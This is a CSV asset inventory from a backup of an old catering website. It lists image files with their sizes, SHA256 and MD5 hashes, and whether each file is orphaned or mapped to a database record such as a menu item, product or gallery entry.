Filename,Relative Path,Size (Bytes),SHA256 Hash,MD5 Hash,Status,DB Table,DB Record ID,DB Item Title,DB Image Column
cocktail-and-sangeet-.jpeg,old-website-php/Full-website-backup/frontEnd/innderheader/cocktail-and-sangeet-.jpeg,600534,daf7f8cb9bb613de111694aee129aa5e57babcac431e0ebc4c5fdeb9a595b6f4,0546d19981f47ef9aba5d1e7da9a5b2e,Static / Orphaned Disk Asset,,,,
cocktail-and-sangeet-.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/cocktail-and-sangeet-.jpg,35402,7f38856105be4b6e0172c435e4d0572c67e6d5470b65ab83c56217c9b780282a,603b06b9aa60c6c963cd741788ee8840,Static / Orphaned Disk Asset,,,,
continental-food-.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/continental-food-.jpg,32782,501ee4d5c502f288edce9a9850d0d00520cc37de15e703a63bb13a391913992a,3a1a6b95d60f9c1df32d6b1a80b72dc9,Static / Orphaned Disk Asset,,,,
events-catering-5.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/events-catering-5.jpg,489360,e05e67af7dd36e53333331258a4bdb26233d7b4673385919cfb921152e7e59ac,93f4c9f25c3d2ff5d039afbf2189a06e,DB Mapped (Verified),website_information,5,EVENTS CATERING,innder_header_img
gala-evening-.jpeg,old-website-php/Full-website-backup/frontEnd/innderheader/gala-evening-.jpeg,789406,9f4d1be3877295c4f5c7f239b808cfbf0939e93da412c8823fb819535925b47d,9ca15604f4b3e2d2baf57c5d97ec4dde,Static / Orphaned Disk Asset,,,,
gala-evening-.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/gala-evening-.jpg,43014,60ed046d790f32dad7e533373fe49b81cd8ed72adcfe68d3591478cf9c4e1dd6,240c89459b126c578bdc35ba3a38eaaa,Static / Orphaned Disk Asset,,,,
hi-tea-menu-.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/hi-tea-menu-.jpg,54397,080eb907be6990efecf2ae82fd47fb9366e1251d5ba3811df3a2a726be290df5,c2a45c123d2270e6df62006650d0fc20,Static / Orphaned Disk Asset,,,,
kids-party-.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/kids-party-.jpg,36607,e5431b53ac7740d430063360aaae2c9f46b23d478508567d9b1bd067f6a49f34,3932372dd9cb6118a1aa667a37edeef6,Static / Orphaned Disk Asset,,,,
no-onion-no-garlic-.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/no-onion-no-garlic-.jpg,50237,9d5654badc4f491bd3cff10344f0ce862e014907aa7cbb13863fdcea6d04dbc2,0d6581e82c36d63c54f9db0261122d30,Static / Orphaned Disk Asset,,,,
our-partners-8.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/our-partners-8.jpg,148064,021ff7587c46c21882a8e19a3708a3d37d02a5799d2d78960f880e77bc304e56,ece5654e74b441473ebeb4d3dfa21737,Static / Orphaned Disk Asset,,,,
our_services.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/our_services.jpg,374354,fd16f92bf9479525581a798eafe859611da68ca6ead65d13526323d673cfaab1,ce3730880f1258334a59008b894f0ce2,Static / Orphaned Disk Asset,,,,
parties-catering-6.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/parties-catering-6.jpg,489360,e05e67af7dd36e53333331258a4bdb26233d7b4673385919cfb921152e7e59ac,93f4c9f25c3d2ff5d039afbf2189a06e,Static / Orphaned Disk Asset,,,,
privacy-policy-2.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/privacy-policy-2.jpg,183969,93651c7d8397e50c59efa7068e5b7746b4502a8b264a8773ac3ec9e1582b9c0e,1b5b7f004b0e1673fc9135c8119d4b90,Static / Orphaned Disk Asset,,,,
roka-ceremony-.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/roka-ceremony-.jpg,394589,72fe88f085ded6c6468c4d542b7f3da56af5ab5956bd13350bc3abd66b5a7c49,534f5cd32855c107902131e8018cf8a6,Static / Orphaned Disk Asset,,,,
royal-lunch-.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/royal-lunch-.jpg,109859,0591ab880a7d2a8f7b0e13dc5faca134ea1ed43799795a59ac65200a5f1bfa16,d486977973c763ed1aa6108a0b6d3c08,Static / Orphaned Disk Asset,,,,
terms-of-use-3.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/terms-of-use-3.jpg,99967,95b16802b5eb7b0b5da5648a8cf9c4d8951145de7a4be6aae51166b795759670,0ce71029cbad2268e34a73e2c1e0d508,Static / Orphaned Disk Asset,,,,
wedding-catering-7.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/wedding-catering-7.jpg,486857,0bd9126af22d697b07b958a1236311b510e6fd15bec56402a616048815372db9,f350884233102563b80d516865faccd6,Static / Orphaned Disk Asset,,,,
wedding-functions-.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/wedding-functions-.jpg,56278,47f395f1eb49a72bc3de5b63cb7f6f28bfafdee1e337e8c7e1784e880928cf41,42e731814a15aa8b7c84660b5f6fd4b0,Static / Orphaned Disk Asset,,,,
fontawesome-webfont.svg,old-website-php/Full-website-backup/frontEnd/inner/fonts/fontawesome-webfont.svg,444379,ad6157926c1622ba4e1d03d478f1541368524bfc46f51e42fe0d945f7ef323e4,912ec66d7572ff821749319396470bde,Static / Orphaned Disk Asset,,,,
banner-01.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/banner-01.jpg,468581,ea0b4eedd06092261d259d1bfd0c1bd05aecee811d9d4690d2df3d1b72d8f2a7,5817ddc14f41d190e238f5a3df974e2f,Static / Orphaned Disk Asset,,,,
banner-01a.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/banner-01a.jpg,199821,c52d8a313ee80991514ecbef01e95d41f6c539d8f80811e17a78c5bd41626a8b,4f72609b5b5ff752617b53ada6cfc9de,Static / Orphaned Disk Asset,,,,
banner-02.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/banner-02.jpg,337137,f5d1a46bca20679d2527b5b28c02ee57ceee42d13fe59cc57bce8eef1b01e2de,cfbaaae91566fe659da41a24628d3f2b,Static / Orphaned Disk Asset,,,,
banner-02a.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/banner-02a.jpg,246135,275e300d5cd5bd1f1231a1a6b2c1ce7653f58f3227e8584f72765dad0b51591d,88f203f23ea6e26cac9b13bd278ab853,Static / Orphaned Disk Asset,,,,
banner-03a.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/banner-03a.jpg,192982,6a9f5e81d4a4ec0f9e7f08facc0400e3efba51ab22e43528241f91595bb3856f,59727a8276e8bf32c92ed544e4ff1a4d,Static / Orphaned Disk Asset,,,,
logo.png,old-website-php/Full-website-backup/frontEnd/inner/img/logo.png,39255,a8fa85bdde9ef347050e6b81284034cd051ee85413371aafd406125762922280,80be1ee82d051357d1d0ffacb2324d1e,Static / Orphaned Disk Asset,,,,
logo2.png,old-website-php/Full-website-backup/frontEnd/inner/img/logo2.png,122801,fd90074148f83d6caadd9c3475372798209d59042ec4fbdd800bd97429d3f292,37ad4e452055532eeb2a1541d73b26ab,Static / Orphaned Disk Asset,,,,
chafe.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/chef/chafe.jpg,30797,2c397a0f2cd45ed818f733781d8e034f8847f7dc2fa36617f106157153867309,efb39419019f4a69dc1510fc211c2f03,Static / Orphaned Disk Asset,,,,
even-01.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/event/even-01.jpg,675158,5ab844cf707d6a4e4bc043260cf616bef2a8fd31a277e85291e17d9c441e5119,e2666e4a49390a51db93e0a38d529121,Static / Orphaned Disk Asset,,,,
even-02.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/event/even-02.jpg,271441,a69e366e124d74a39b8cb325866028b76a65abdc4a61af8145de30c6089c3314,f23addfb6f9edbf4bde377f210571bc0,Static / Orphaned Disk Asset,,,,
even-03.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/event/even-03.jpg,258003,a98983608f268d02c5abc556f61c20da7974ff85f81e5de2080798833a8e86f7,ecbb437d2d905006992132616a3aab66,Static / Orphaned Disk Asset,,,,
gallery-01.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/gallery/gallery-01.jpg,63334,8bb60a7c491d2243dbdff18dff33d41a1e4748ef31ea40961aa879581c5e12fc,b6911649019762cc5f4714960b8d9751,Static / Orphaned Disk Asset,,,,
gallery-02.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/gallery/gallery-02.jpg,195662,a33545577a0a177cecc19bc931fda64098933f8e54ea42447fe29f19de7edcbb,c561ff38d5ea85b579ae9b57b14ab995,Static / Orphaned Disk Asset,,,,
gallery-03.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/gallery/gallery-03.jpg,120005,3bc93d5536b513f5deb4187b34fbd1f57d217654608684fa640033f3e1a2a7b7,822397d93065b3966ddc0d308fca5d72,Static / Orphaned Disk Asset,,,,
gallery-04.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/gallery/gallery-04.jpg,149551,da0b6cd418dcaba663a07d044f919f9f6ccaf05c2140b791299dade7cea0a40f,1451672ee75d90d8f42c282c51bd0f90,Static / Orphaned Disk Asset,,,,
happy-review-01.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/happy-review/happy-review-01.jpg,10073,be03df15f2d151aca726b511f040300a10fda71b596ffe4e09e5c5480470e272,14b027de14b0a7dc9e8164032daa1fe9,Static / Orphaned Disk Asset,,,,
happy-review-02.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/happy-review/happy-review-02.jpg,16087,eb21bae0b89629c82fa677704bb289fad8abaab8940691af1fd47b8d04e60b3e,737c2ba8d7400394c4532a52d88fbf7c,Static / Orphaned Disk Asset,,,,
happy-review-03.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/happy-review/happy-review-03.jpg,23413,1b1295f866ce5ce4a48aa091dd8f2737ff2a50ef878a2e358156b905ac861dbc,cc1a6d38c2f54dc3031724b59b098e9c,Static / Orphaned Disk Asset,,,,
review-bg.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/happy-review/review-bg.jpg,123873,bfc9680013ba2f342b5f88a704b5eef18509d4b2480f0808c05f3bec557a0ec6,3601524ae70e652849d95b31a92cf56e,Static / Orphaned Disk Asset,,,,
halwai-icon01.png,old-website-php/Full-website-backup/frontEnd/inner/img/icons/halwai-icon01.png,11932,29f9e5d07fee9e22fe2583c59aa1d27d9da4115ddb02b95d66990ad2a1d03116,a78e5f30f9c6aea2edf70634892ba856,Static / Orphaned Disk Asset,,,,
halwai-icon02.png,old-website-php/Full-website-backup/frontEnd/inner/img/icons/halwai-icon02.png,10066,8244f9673e81bf8e728dceb63e1a974bb891e95e8a4613111c0490f2c2efd0b0,1dc5936bac57974fbecec7f608bc1414,Static / Orphaned Disk Asset,,,,
halwai-icon03.png,old-website-php/Full-website-backup/frontEnd/inner/img/icons/halwai-icon03.png,11066,f4004c1758dd9937f8db06d95ed6202d09dc3f59ddd7e4dc936a9f2c8533e999,e5cc634ef420ed713b3fcac81b6aed75,Static / Orphaned Disk Asset,,,,
halwai-icon04.png,old-website-php/Full-website-backup/frontEnd/inner/img/icons/halwai-icon04.png,13952,54f16c5b7e366581b792dbbe78a231a58ce34224b7af4e5cdcd9cd641acad9d5,92e4bb3e460f2566eea1f33bdea9ddd3,Static / Orphaned Disk Asset,,,,
bartenders-for-parties385px.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/images for tittle/bartenders-for-parties385px.jpg,65285,292ff1a589fd00f252b9e4af5a6c599209cb0ec1d7fd61e8b95e10ca83904553,3d88a64f1291c374089832bbc1b094d8,Static / Orphaned Disk Asset,,,,
cleaners-at-home385px.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/images for tittle/cleaners-at-home385px.jpg,80834,1049263cbb0fcb46e584f5cd74f46193eb15d929b342900b9015ae4cb05367ac,554bf2b1d1bf3b6e8021e8a6bae105cb,Static / Orphaned Disk Asset,,,,
cooks-&-chefs385px.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/images for tittle/cooks-&-chefs385px.jpg,66230,54ecc583500cf45ba066ca04d14ffad51b4dc1c53c1bad66f5fe90c6bf85af11,fa90a1335e15e207d3da4cc608534c3f,Static / Orphaned Disk Asset,,,,
crockeryon-rent385px.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/images for tittle/crockeryon-rent385px.jpg,121595,3c9cba2eae087257f4908a044b7ad09088252fd1c0d41f5085c93a7df2f9e41e,fa084de2f92211f243bfdc1ad3966210,Static / Orphaned Disk Asset,,,,
entertainer385px.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/images for tittle/entertainer385px.jpg,96016,c4b6e16f71257e46f49fe08e268e3892491e83afdb48307d426bfac01778b250,349b7b2a42101ef4b25a465ee38e7964,Static / Orphaned Disk Asset,,,,
ingredients-delivery-385px.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/images for tittle/ingredients-delivery-385px.jpg,87975,7d4233f3f82991261843470f881f56b75bded9e01559f387792bcf88338258e1,3d313cf766f69bb062bd271517774f3f,Static / Orphaned Disk Asset,,,,
party-decorator385px.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/images for tittle/party-decorator385px.jpg,97201,e6c2c939b35fb9b5a8f44ca86c425339555e9a4469aa76512be2d8cede60f5fb,74aa500af9a060752134738e88c1c5a5,Static / Orphaned Disk Asset,,,,
waiters-for-events385px.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/images for tittle/waiters-for-events385px.jpg,65365,b96ddd753b8b47677aaed8b0f8fd2e48888826f8c54a6e0ac668189dba2e6ed2,dc9ed820c2b9345fcfc9f063bc0760cd,Static / Orphaned Disk Asset,,,,
demand-01.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/on-demand/demand-01.jpg,66230,54ecc583500cf45ba066ca04d14ffad51b4dc1c53c1bad66f5fe90c6bf85af11,fa90a1335e15e207d3da4cc608534c3f,Static / Orphaned Disk Asset,,,,
demand-02.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/on-demand/demand-02.jpg,65285,292ff1a589fd00f252b9e4af5a6c599209cb0ec1d7fd61e8b95e10ca83904553,3d88a64f1291c374089832bbc1b094d8,Static / Orphaned Disk Asset,,,,
demand-03.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/on-demand/demand-03.jpg,65365,b96ddd753b8b47677aaed8b0f8fd2e48888826f8c54a6e0ac668189dba2e6ed2,dc9ed820c2b9345fcfc9f063bc0760cd,Static / Orphaned Disk Asset,,,,
demand-04.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/on-demand/demand-04.jpg,87975,7d4233f3f82991261843470f881f56b75bded9e01559f387792bcf88338258e1,3d313cf766f69bb062bd271517774f3f,Static / Orphaned Disk Asset,,,,
demand-05.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/on-demand/demand-05.jpg,80834,1049263cbb0fcb46e584f5cd74f46193eb15d929b342900b9015ae4cb05367ac,554bf2b1d1bf3b6e8021e8a6bae105cb,Static / Orphaned Disk Asset,,,,
demand-06.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/on-demand/demand-06.jpg,121595,3c9cba2eae087257f4908a044b7ad09088252fd1c0d41f5085c93a7df2f9e41e,fa084de2f92211f243bfdc1ad3966210,Static / Orphaned Disk Asset,,,,
demand-07.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/on-demand/demand-07.jpg,97201,e6c2c939b35fb9b5a8f44ca86c425339555e9a4469aa76512be2d8cede60f5fb,74aa500af9a060752134738e88c1c5a5,Static / Orphaned Disk Asset,,,,
demand-08.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/on-demand/demand-08.jpg,96016,c4b6e16f71257e46f49fe08e268e3892491e83afdb48307d426bfac01778b250,349b7b2a42101ef4b25a465ee38e7964,Static / Orphaned Disk Asset,,,,
service-01.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/serivces/service-01.jpg,95231,ce79313be18a3f6729878e25409e8deb77358298d28d43eb2205c7765a7be06b,9dd26931df1e5b0401f1f425537b548c,Static / Orphaned Disk Asset,,,,
service-02.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/serivces/service-02.jpg,109666,7854d5f96d1b8d1eddd2fa5f260e6dacf705bceb402c4fce101bd9ec1a5ee577,d24eb2fabd44df90ea536182a0fc1e1e,Static / Orphaned Disk Asset,,,,
service-03.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/serivces/service-03.jpg,142265,ed9f997dd7332f31800105c7251744280c5fb9c0d4efd23d616f3326067c3740,2be18c39a8a97735b4980d73367b85fd,Static / Orphaned Disk Asset,,,,
slider-01.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/slider/slider-01.jpg,183740,73682b50944d4e491aed53bcbe7a9686399d11b2b0bdf62a676f7b8f0007c373,644db9a00583e02836a330bf04ee5d3f,Static / Orphaned Disk Asset,,,,
slider-02.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/slider/slider-02.jpg,114607,4d2371c90c3a5e2e2d6fad5b638ab3715cc4c9cfc9284813fc4ea1926e8ea18a,a37f4028f501768b2adc19988647faa2,Static / Orphaned Disk Asset,,,,
slider-03.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/slider/slider-03.jpg,148325,43e4d167fb0db143ecf0e48cb1ad20db56f88e4fbbd1db09844207be81f0cf1b,2ae4a8f83140bff7f2f562fa19ec97e8,Static / Orphaned Disk Asset,,,,
special-01.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/special/special-01.jpg,33115,2c38d8ba4a424661f442761de9d604a5f627ab03271876445b56107f4c18e012,81cc5746efd277f90bf062bd65f96b63,Static / Orphaned Disk Asset,,,,
special-02.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/special/special-02.jpg,36163,baf4bdf066ded0aca010bac9593acc5b737f6e8b5d5fb4412033b0e8e8b5fdbb,9be28407c36f31ce9ebc6cca90250643,Static / Orphaned Disk Asset,,,,
special-03.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/special/special-03.jpg,38877,15ce7c2ace8bc8d9af5a09cc14e7db35aa2c5617b55a274cd0780d421ac778b4,9afa8b98c1a5e38160d9341c9928a03e,Static / Orphaned Disk Asset,,,,
special-04.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/special/special-04.jpg,42037,47098b783a3662b8f7091a08830f833883fea6fd54528949e0c36d57ff5b0518,44bfb33fda0c3528d0adbcdaf6575b7f,Static / Orphaned Disk Asset,,,,
special-05.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/special/special-05.jpg,38417,159c2edf4f50f7a2e2940d26a285a8d505283feeaa215a28ba95f29b33d65077,0c0ce45fece6c637d191bf6b4b5dcc64,Static / Orphaned Disk Asset,,,,
special-06.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/special/special-06.jpg,42104,060eae6b01a931ac9b296b3f24e2e054c387733787e2f61d1ce64e416bbdb69c,b4d82dbbb4783c393e288ecc4c613fb3,Static / Orphaned Disk Asset,,,,
wordwild-01.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/wordwild/wordwild-01.jpg,47952,cc387308d2ff02a13726daa9479548e62bb5df9e7a135140f3120e5f8883db74,facb9eb534a4dd63c73215a45ca8ba8a,Static / Orphaned Disk Asset,,,,
wordwild-02.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/wordwild/wordwild-02.jpg,42990,f1f2032367b6ef57b491a7c6a408e1781886ff7ec909a887dd0cc76b30a09a3e,5630df2dce730cc414d06b58046bac5e,Static / Orphaned Disk Asset,,,,
.jpg,old-website-php/Full-website-backup/frontEnd/items/.jpg,67087,867fedd024a2fa740c9e6f6c09f65d610d542748beff9739beb07ccc50729dde,483ec61bde8e2e847fdd7b325b329545,Static / Orphaned Disk Asset,,,,
1.jpg,old-website-php/Full-website-backup/frontEnd/items/1.jpg,7043,fbf2332171158a9ae54ef809ab41f31baedb5702d5b7627a31ddf0bb4a045a16,cff992df65b08d3290d291a3184d192b,DB Mapped (Verified),menu_item_tbl,1,Dosa (Plain & Masala),menu_img
1.jpg,old-website-php/Full-website-backup/frontEnd/items/1.jpg,7043,fbf2332171158a9ae54ef809ab41f31baedb5702d5b7627a31ddf0bb4a045a16,cff992df65b08d3290d291a3184d192b,DB Mapped (Verified),menu_item_tbl,1,Dosa (Plain & Masala),menu_small_img
1.jpg,old-website-php/Full-website-backup/frontEnd/items/1.jpg,7043,fbf2332171158a9ae54ef809ab41f31baedb5702d5b7627a31ddf0bb4a045a16,cff992df65b08d3290d291a3184d192b,DB Mapped (Verified),product_item_tbl,1,Desi Bundi Laddo,menu_img
1.jpg,old-website-php/Full-website-backup/frontEnd/items/1.jpg,7043,fbf2332171158a9ae54ef809ab41f31baedb5702d5b7627a31ddf0bb4a045a16,cff992df65b08d3290d291a3184d192b,DB Mapped (Verified),website_gallery,1,Images 1,gimage
1.jpg,old-website-php/Full-website-backup/frontEnd/items/1.jpg,7043,fbf2332171158a9ae54ef809ab41f31baedb5702d5b7627a31ddf0bb4a045a16,cff992df65b08d3290d291a3184d192b,DB Mapped (Verified),recipe_appliances_kits,1,Onion,kits_img
1.jpg,old-website-php/Full-website-backup/frontEnd/items/1.jpg,7043,fbf2332171158a9ae54ef809ab41f31baedb5702d5b7627a31ddf0bb4a045a16,cff992df65b08d3290d291a3184d192b,DB Mapped (Verified),event_cuisine,1,South Indian,cuisine_img
10.jpg,old-website-php/Full-website-backup/frontEnd/items/10.jpg,12988,4f56173fa028b0e84cbca5a8f41d8ab75d1b65c41fdbe066435a7429c32c9f33,77958e4a48b00baa209cf8adb3e5b1e6,DB Mapped (Verified),product_item_tbl,10,Atta Panjiri,menu_img
10.jpg,old-website-php/Full-website-backup/frontEnd/items/10.jpg,12988,4f56173fa028b0e84cbca5a8f41d8ab75d1b65c41fdbe066435a7429c32c9f33,77958e4a48b00baa209cf8adb3e5b1e6,DB Mapped (Verified),website_gallery,10,Evevt At rishikesh,gimage
10.jpg,old-website-php/Full-website-backup/frontEnd/items/10.jpg,12988,4f56173fa028b0e84cbca5a8f41d8ab75d1b65c41fdbe066435a7429c32c9f33,77958e4a48b00baa209cf8adb3e5b1e6,DB Mapped (Verified),worke_work_experience,10,as worked at2,workproimg
10.jpg,old-website-php/Full-website-backup/frontEnd/items/10.jpg,12988,4f56173fa028b0e84cbca5a8f41d8ab75d1b65c41fdbe066435a7429c32c9f33,77958e4a48b00baa209cf8adb3e5b1e6,DB Mapped (Verified),recipe_appliances_kits,10,Red Bell Pepper,kits_img
11.jpg,old-website-php/Full-website-backup/frontEnd/items/11.jpg,7557,b993bc36926aa2e7f0641f717818b221b8c863378116b0aceddb598ca88084e1,afd10a47409b0df2791fc5ce0d11946a,DB Mapped (Verified),menu_item_tbl,11,Dal Tadka,menu_img
11.jpg,old-website-php/Full-website-backup/frontEnd/items/11.jpg,7557,b993bc36926aa2e7f0641f717818b221b8c863378116b0aceddb598ca88084e1,afd10a47409b0df2791fc5ce0d11946a,DB Mapped (Verified),product_item_tbl,11,Balushai,menu_img
11.jpg,old-website-php/Full-website-backup/frontEnd/items/11.jpg,7557,b993bc36926aa2e7f0641f717818b221b8c863378116b0aceddb598ca88084e1,afd10a47409b0df2791fc5ce0d11946a,DB Mapped (Verified),website_gallery,11,Event at Delhi,gimage
11.jpg,old-website-php/Full-website-backup/frontEnd/items/11.jpg,7557,b993bc36926aa2e7f0641f717818b221b8c863378116b0aceddb598ca88084e1,afd10a47409b0df2791fc5ce0d11946a,DB Mapped (Verified),worke_work_experience,11,North Indian Dishes by,workproimg
11.jpg,old-website-php/Full-website-backup/frontEnd/items/11.jpg,7557,b993bc36926aa2e7f0641f717818b221b8c863378116b0aceddb598ca88084e1,afd10a47409b0df2791fc5ce0d11946a,DB Mapped (Verified),recipe_appliances_kits,11,Yellow Bell Pepper,kits_img
12.jpg,old-website-php/Full-website-backup/frontEnd/items/12.jpg,6906,9b18bc273421e16ef3615b30a64f8de3f08bfecf0d0cb497eac03b1414e6f4fd,283259a2910ef5674b0d90484b68650e,DB Mapped (Verified),product_item_tbl,12,Besan Dry Fruit Laddo,menu_img
12.jpg,old-website-php/Full-website-backup/frontEnd/items/12.jpg,6906,9b18bc273421e16ef3615b30a64f8de3f08bfecf0d0cb497eac03b1414e6f4fd,283259a2910ef5674b0d90484b68650e,DB Mapped (Verified),website_gallery,12,Event at Delhi,gimage
12.jpg,old-website-php/Full-website-backup/frontEnd/items/12.jpg,6906,9b18bc273421e16ef3615b30a64f8de3f08bfecf0d0cb497eac03b1414e6f4fd,283259a2910ef5674b0d90484b68650e,DB Mapped (Verified),worke_work_experience,12,North Indian Dishes by2,workproimg
12.jpg,old-website-php/Full-website-backup/frontEnd/items/12.jpg,6906,9b18bc273421e16ef3615b30a64f8de3f08bfecf0d0cb497eac03b1414e6f4fd,283259a2910ef5674b0d90484b68650e,DB Mapped (Verified),recipe_appliances_kits,12,Mushroom,kits_img
13.jpg,old-website-php/Full-website-backup/frontEnd/items/13.jpg,8178,f712d28d7e551c4c554ce71509da279dd40850f7594d1550a169f4d2de9f787b,2d99f22d9dfeae725670fa1a2601f4e3,DB Mapped (Verified),menu_item_tbl,13,Paneer Lababdar,menu_img
13.jpg,old-website-php/Full-website-backup/frontEnd/items/13.jpg,8178,f712d28d7e551c4c554ce71509da279dd40850f7594d1550a169f4d2de9f787b,2d99f22d9dfeae725670fa1a2601f4e3,DB Mapped (Verified),product_item_tbl,13,Besan Laddo,menu_img
13.jpg,old-website-php/Full-website-backup/frontEnd/items/13.jpg,8178,f712d28d7e551c4c554ce71509da279dd40850f7594d1550a169f4d2de9f787b,2d99f22d9dfeae725670fa1a2601f4e3,DB Mapped (Verified),website_gallery,13,Evevt At rishikesh,gimage
13.jpg,old-website-php/Full-website-backup/frontEnd/items/13.jpg,8178,f712d28d7e551c4c554ce71509da279dd40850f7594d1550a169f4d2de9f787b,2d99f22d9dfeae725670fa1a2601f4e3,DB Mapped (Verified),worke_work_experience,13,tarters Dishes by1,workproimg
13.jpg,old-website-php/Full-website-backup/frontEnd/items/13.jpg,8178,f712d28d7e551c4c554ce71509da279dd40850f7594d1550a169f4d2de9f787b,2d99f22d9dfeae725670fa1a2601f4e3,DB Mapped (Verified),recipe_appliances_kits,13,Mint Leaves,kits_img
14.jpg,old-website-php/Full-website-backup/frontEnd/items/14.jpg,5989,a47e000a49afecda456a837f99f0b1b3058537acf6a0847ec1a2b1e73f86792e,02e0a6c393a316b557db1962464b8e71,DB Mapped (Verified),product_item_tbl,14,Chhena Murgi,menu_img
14.jpg,old-website-php/Full-website-backup/frontEnd/items/14.jpg,5989,a47e000a49afecda456a837f99f0b1b3058537acf6a0847ec1a2b1e73f86792e,02e0a6c393a316b557db1962464b8e71,DB Mapped (Verified),website_gallery,14,Event at Delhi,gimage
14.jpg,old-website-php/Full-website-backup/frontEnd/items/14.jpg,5989,a47e000a49afecda456a837f99f0b1b3058537acf6a0847ec1a2b1e73f86792e,02e0a6c393a316b557db1962464b8e71,DB Mapped (Verified),worke_work_experience,14,tarters Dishes by12,workproimg
15.jpg,old-website-php/Full-website-backup/frontEnd/items/15.jpg,14325,202844a28966bf95539e1a4b3127f61ec7dc6cdb1ff60f5d68cd0c5d781e67ac,0012e082ab7b93fcc4dc01767e24b578,DB Mapped (Verified),product_item_tbl,15,Desi Ghee Bundi,menu_img
15.jpg,old-website-php/Full-website-backup/frontEnd/items/15.jpg,14325,202844a28966bf95539e1a4b3127f61ec7dc6cdb1ff60f5d68cd0c5d781e67ac,0012e082ab7b93fcc4dc01767e24b578,DB Mapped (Verified),website_gallery,15,Event at DPS school Gurugram,gimage
